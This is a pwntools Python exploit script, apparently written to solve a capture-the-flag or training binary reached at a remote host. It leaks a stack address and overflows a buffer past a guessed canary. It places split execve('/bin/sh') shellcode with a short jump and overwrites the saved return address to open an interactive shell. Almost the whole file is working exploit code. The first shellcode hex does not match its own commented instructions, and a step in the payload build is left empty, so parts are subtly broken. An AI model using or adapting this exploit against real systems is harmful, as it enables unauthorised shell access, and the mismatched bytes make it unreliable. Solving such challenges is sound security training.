#!/usr/bin/env python3
import re
import struct

from pwn import *

exe = context.binary = ELF(args.EXE or "8-prepa-01-burger")

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    io = gdb.debug(
        "./8-prepa-01-burger",
        """
        source /home/ryan/.gdbinit-gef.py
        b *main
        continue
        """,
    )
elif args.LOCAL:
    io = process("./8-prepa-01-burger")
else:
    io = remote("cytech.tcdn.casa", 4801)

io.recvuntil(b"at ")
raw = io.recvuntil(b"\n\n", drop=True)
m = re.search(rb"0x[0-9a-fA-F]+", raw)
leak = int(m.group(0), 16)

canary_offset = 15
canary_size = 8
saved_rip_offset = 39

# Addresses absolues
buffer_addr = leak
saved_rip_addr = buffer_addr + saved_rip_offset
space_after_canary = saved_rip_offset - (canary_offset + canary_size)

# --- shellcode blobs (zero-free) ---
# piece1 (15 bytes): push rdi; mov rdi,rsp; xor eax,eax; push rax; push rdi; mov rsi,rsp; mov al,0x3b; syscall
piece1 = bytes.fromhex("578489e731c050574889e6b03b0f05")
assert len(piece1) == 15

# piece2 core (14 bytes): movabs rdi, "//bin/sh" ; shr rdi,8  => we append EB <rel8> to make 16 bytes total
p2_core = bytes.fromhex("48bf2f2f62696e2f736848c1ef08")
assert len(p2_core) == 14

# piece2 will be placed starting at saved_rbp slot (so it can be split across the gap and saved_rbp)
piece2_addr = buffer_addr + canary_offset + canary_size
piece1_addr = buffer_addr

# compute rel8 (jump from end of piece2 to piece1 start)
# address of instruction following the short jmp = piece2_addr + len(p2_core) + 2
next_ip = piece2_addr + len(p2_core) + 2
rel8 = piece1_addr - next_ip

if not (-128 <= rel8 <= 127):
    raise SystemExit(
        f"[ERROR] rel8 out of signed byte range: {rel8} ; adjust placement."
    )

# finalize piece2 (16 bytes)
piece2 = p2_core + b"\xeb" + struct.pack("b", rel8)
assert len(piece2) == 16

# sanity checks
if len(piece1) > canary_offset:
    raise SystemExit(
        f"[ERROR] piece1 ({len(piece1)}b) doesn't fit before canary ({canary_offset}b)."
    )

if len(piece2) > space_after_canary:
    raise SystemExit(
        f"[ERROR] piece2 ({len(piece2)}b) doesn't fit in gap+saved_rbp ({space_after_canary}b)."
    )

# Build payload:
payload = b""
# 1) piece1 at buffer start
payload += piece1
# pad up to canary_offset
payload += b"\x90" * (canary_offset - len(piece1))
# 2) exact canary (custom)
payload += p64(0xDEADBEEFDEADBEEF)[:canary_size]
# 3) place first chunk of piece2 in the gap after canary (space_after_canary bytes)
payload += piece2
# 4) ensure we are exactly at saved_rip_offset
if len(payload) < saved_rip_offset:
    payload = payload.ljust(saved_rip_offset, b"\x90")
elif len(payload) > saved_rip_offset:
    raise SystemExit(
        f"[ERROR] payload length {len(payload)} > saved_rip_offset {saved_rip_offset} (bad split)"
    )
# 6) write saved_rip = start of piece2
payload += p64(piece2_addr)
# 7) append any leftover of piece2 (beyond the 8 used for saved_rbp)

# output useful info
print(f"piece1_len = {len(piece1)}  piece2_len = {len(piece2)}")
print(f"piece1_addr = 0x{piece1_addr:x}")
print(f"piece2_addr = 0x{piece2_addr:x}")
print(f"rel8 (signed) = {rel8}")
print(f"payload_len = {len(payload)}")
print("")
print("piece1_hex =", piece1.hex())
print("piece2_hex =", piece2.hex())
print("payload_hex =", payload.hex())
print("")

io.sendline(payload)
io.interactive()
